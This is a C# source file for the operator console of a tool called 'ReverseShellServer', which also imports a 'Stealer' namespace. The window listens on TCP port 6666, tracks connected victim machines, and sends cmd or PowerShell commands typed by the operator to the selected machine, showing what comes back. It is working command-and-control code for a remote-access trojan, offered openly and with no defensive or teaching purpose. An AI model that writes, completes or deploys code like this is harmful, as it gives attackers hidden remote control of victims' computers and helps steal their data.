using Newtonsoft.Json;
using ReverseShellServer.Models;
using Stealer;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Xml.XPath;

namespace ReverseShellServer
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private TcpServer tcpServer;
        private CancellationTokenSource cancellationToken = new CancellationTokenSource();
        private ObservableCollection<string> connectedClients = new ObservableCollection<string>();
        private StreamWriter streamWriter;
        private StreamReader streamReader;
        private string activeEndpoint;
        private ICommandExecutor commandExecutor;

        public MainWindow()
        {
            InitializeComponent();

            tcpServer = new TcpServer(6666);
            tcpServer.StartListening(cancellationToken.Token);

            tcpServer.ClientConnectedEvent += HandleNewConnection;
            tcpServer.ClientDisconnectedEvent += HandleLostConnection;
            tcpServer.DataRecievedEvent += HandleReceivedData;

            ClientList.ItemsSource = connectedClients;

            Application.Current.Dispatcher.ShutdownStarted += (object sender, EventArgs e) =>
            {
                cancellationToken.Cancel();
            };

            // Используйте CmdExecutor по умолчанию
            commandExecutor = new CmdExecutor(streamWriter);
        }

        private void ExecuteCommand(string command)
        {
            // Вызовите метод ExecuteCommand на текущем исполнителе команд
            commandExecutor.ExecuteCommand(command);
        }

        private void SetCommandExecutor(bool usePowerShell)
        {
            if (usePowerShell)
                commandExecutor = new PowerShellExecutor(streamWriter);
            else
                commandExecutor = new CmdExecutor(streamWriter);

        }

        private void CmdRadio_Checked(object sender, RoutedEventArgs e)
        {
            SetCommandExecutor(usePowerShell: false);
        }

        private void PowerShellRadio_Checked(object sender, RoutedEventArgs e)
        {
            SetCommandExecutor(usePowerShell: true);
        }

        private void HandleNewConnection(object sender, ClientConnectedArgs e)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                ClientNumLabel.Content = "Connected Clients: " + tcpServer.ClientMap.Count;
                string clientEndpoint = (sender as TcpClient).Client.RemoteEndPoint.ToString();
                connectedClients.Add(clientEndpoint);
                OutputConsole.AppendText("\n");
                OutputConsole.AppendText($"Client connected ({clientEndpoint})");

                if (activeEndpoint == null)
                {
                    activeEndpoint = clientEndpoint;
                    streamReader = new StreamReader((sender as TcpClient).GetStream());
                    streamWriter = new StreamWriter((sender as TcpClient).GetStream());

                    activeEndpoint = clientEndpoint;
                    TcpClient client = (sender as TcpClient);
                    NetworkStream networkStream = client.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                }


               

            });
        }
  

        private void HandleLostConnection(object sender, EventArgs e)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                ClientNumLabel.Content = "Connected Clients: " + tcpServer.ClientMap.Count;
                string clientEndpoint = (sender as TcpClient).Client.RemoteEndPoint.ToString();
                connectedClients.Remove(connectedClients.Where(i => i == clientEndpoint).Single());
                OutputConsole.AppendText($"\nClient disconnected ({clientEndpoint})");
            });
        }
        private void HandleReceivedData(object sender, DataRecievedArgs e)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                OutputConsole.AppendText("\n");
                OutputConsole.AppendText(e.Data);
                (OutputConsole.Parent as ScrollViewer).ScrollToBottom();
            });
        }

        private void SendMessage(object sender, RoutedEventArgs e)
        {
            string message = InputConsole.Text;

            ExecuteCommand(message);

            InputConsole.Clear();
        }

        private void SelectClient(object sender, MouseButtonEventArgs e)
        {
            TextBlock clientBlock = sender as TextBlock;
            string endpoint = clientBlock.Text;

            Console.WriteLine($"Clicked on {endpoint}, active: {activeEndpoint}");

            if (endpoint != activeEndpoint)
            {
                TcpClient client = tcpServer.ClientMap[endpoint];
                activeEndpoint = endpoint;
                streamReader = new StreamReader(client.GetStream());
                streamWriter = new StreamWriter(client.GetStream());
                Console.WriteLine($"Switched to client {endpoint}");

                OutputConsole.AppendText("\n");
                OutputConsole.AppendText($"\nSwitched to client {endpoint}");
            }
        }

        private void InputConsole_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
            {
                SendMessage(sender, e);
                InputConsole.Focus();
            }
        }

        private void InputConsole_TextChanged(object sender, TextChangedEventArgs e)
        {
          
        }
    }

}
